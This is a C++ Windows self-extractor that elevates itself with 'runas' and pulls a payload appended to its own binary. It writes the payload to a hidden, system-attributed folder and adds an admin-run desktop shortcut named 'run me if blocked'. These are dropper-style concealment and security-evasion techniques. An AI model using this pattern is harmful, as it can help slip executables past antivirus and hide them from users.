#include <windows.h>
#include <cstdio>
#include <shlobj.h>
#include <shobjidl.h>
#include <vector>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

#ifndef SLDF_RUNAS_USER
#define SLDF_RUNAS_USER 0x00000020
#endif

static bool IsElevated() {
    BOOL e = FALSE; HANDLE t = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        TOKEN_ELEVATION te; DWORD sz = sizeof(te);
        GetTokenInformation(t, TokenElevation, &te, sz, &sz);
        e = te.TokenIsElevated; CloseHandle(t);
    }
    return e == TRUE;
}

int main() {
    // 没管理员就提权自己
    if (!IsElevated()) {
        wchar_t p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
        ShellExecuteW(NULL, L"runas", p, NULL, NULL, SW_SHOW);
        return 0;
    }

    // 自己提取末尾数据
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    HANDLE hS = CreateFileW(self, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hS == INVALID_HANDLE_VALUE) {
        MessageBoxW(NULL, L"读取自身失败", L"错误", MB_ICONERROR); return 1;
    }
    BYTE tail[12]; DWORD fs = GetFileSize(hS, NULL);
    SetFilePointer(hS, fs - 12, NULL, FILE_BEGIN);
    DWORD rd; ReadFile(hS, tail, 12, &rd, NULL);
    if (memcmp(tail + 4, "SFX_MARK", 8) != 0) {
        CloseHandle(hS);
        MessageBoxW(NULL, L"不是有效的自解压文件", L"错误", MB_ICONERROR); return 1;
    }
    DWORD ds = *(DWORD*)tail; DWORD off = fs - 12 - ds;
    std::vector<BYTE> dat(ds);
    SetFilePointer(hS, off, NULL, FILE_BEGIN);
    ReadFile(hS, dat.data(), ds, &rd, NULL); CloseHandle(hS);
    if (rd != ds) { MessageBoxW(NULL, L"读取失败", L"错误", MB_ICONERROR); return 1; }

    // 解压
    CreateDirectoryW(L"D:\\SystemData", NULL);
    SetFileAttributesW(L"D:\\SystemData", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    HANDLE hO = CreateFileW(L"D:\\SystemData\\run.com", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hO == INVALID_HANDLE_VALUE) { MessageBoxW(NULL, L"写入失败", L"错误", MB_ICONERROR); return 1; }
    DWORD wt; WriteFile(hO, dat.data(), ds, &wt, NULL); CloseHandle(hO);
    SetFileAttributesW(L"D:\\SystemData\\run.com", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    // 快捷方式
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    IShellLinkW* psl = NULL;
    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl)) && psl) {
        psl->SetPath(L"D:\\SystemData\\run.com");
        IShellLinkDataList* pdl = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IShellLinkDataList, (void**)&pdl)) && pdl) {
            DWORD f = 0; pdl->GetFlags(&f); pdl->SetFlags(f | SLDF_RUNAS_USER); pdl->Release();
        }
        IPersistFile* ppf = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf)) && ppf) {
            ppf->Save(L"D:\\Desktop\\如果被拦截运行我.com", TRUE); ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();

    MessageBoxW(NULL, L"自解压完成！\n\n文件: D:\\SystemData\\run.com（隐藏）\n快捷方式: 桌面 → 如果被拦截运行我.com", L"成功", MB_OK);
    return 0;
}
